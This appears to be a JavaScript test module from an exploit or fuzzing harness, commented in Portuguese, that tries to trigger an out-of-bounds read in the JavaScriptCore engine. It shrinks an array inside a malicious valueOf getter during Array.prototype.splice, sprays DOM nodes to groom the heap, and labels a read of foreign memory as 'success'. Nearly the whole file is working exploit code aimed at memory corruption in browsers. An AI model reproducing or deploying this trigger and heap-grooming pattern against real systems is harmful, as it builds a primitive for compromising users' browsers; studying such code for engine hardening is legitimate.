
import { Groomer } from '../mod_groomer.js';

export default {
    id:       'ARRAY_BUTTERFLY_SPLICE_OOB',
    category: 'CoreJS',
    risk:     'CRITICAL',
    description:
        'Mutação do JSArray Butterfly durante a execução do C++ Array.prototype.splice. ' +
        'O tamanho do array é reduzido a zero dentro de um getter maligno (valueOf) ' +
        'enquanto o motor C++ está a mover os elementos. Resulta em Out-Of-Bounds (OOB).',

    setup: function() {
        this.results = {};

        // Criamos o array vulnerável (Array de Doubles)
        // NOTA: índice 10 recebe um SENTINEL único e reconhecível (9999.0001)
        // para distinguir "leu a própria butterfly stale" de "leu lixo externo".
        this.vulnArray = [];
        for (let i = 0; i < 20; i++) {
            this.vulnArray.push(1.111111 + i);
        }
        this.vulnArray[10] = 9999.0001; // ← SENTINEL ÚNICO no índice alvo

        const self = this;
        this.evilObject = {
            valueOf: function() {
                self.vulnArray.length = 0;
                let trash = Groomer.sprayDOM('div', 1000);
                return 9.999999;
            }
        };
    },

    trigger: function() {
        try {
            this.vulnArray.splice(5, 1, this.evilObject);
        } catch(e) {
            this.results.error = e.message;
        }
    },

    probe: [
        // Probe 0: Tamanho final visto pelo motor C++
        s => s.vulnArray.length,

        // Probe 1: tipo do índice 10 (deve ser 'undefined' se length=0 for respeitado)
        s => typeof s.vulnArray[10],

        // Probe 2: Classificador de resultado
        s => {
            let val = s.vulnArray[10];
            if (typeof val === 'undefined') {
                return 'Protegido / Array Vazio';
            }
            if (typeof val === 'number' && !isNaN(val)) {
                // Distingue leitura da própria butterfly de lixo externo real
                if (Math.abs(val - 9999.0001) < 0.0001) {
                    return `⚠️ OOB Confirmado (Butterfly Stale): ${val} — acesso fora dos limites mas dados próprios`;
                }
                return `💥 SUCESSO! OOB Read (Lixo Externo da RAM): ${val}`;
            }
            return `Inesperado: ${val}`;
        }
    ],

    cleanup: function() {
        this.vulnArray = null;
        this.evilObject = null;
    }
};
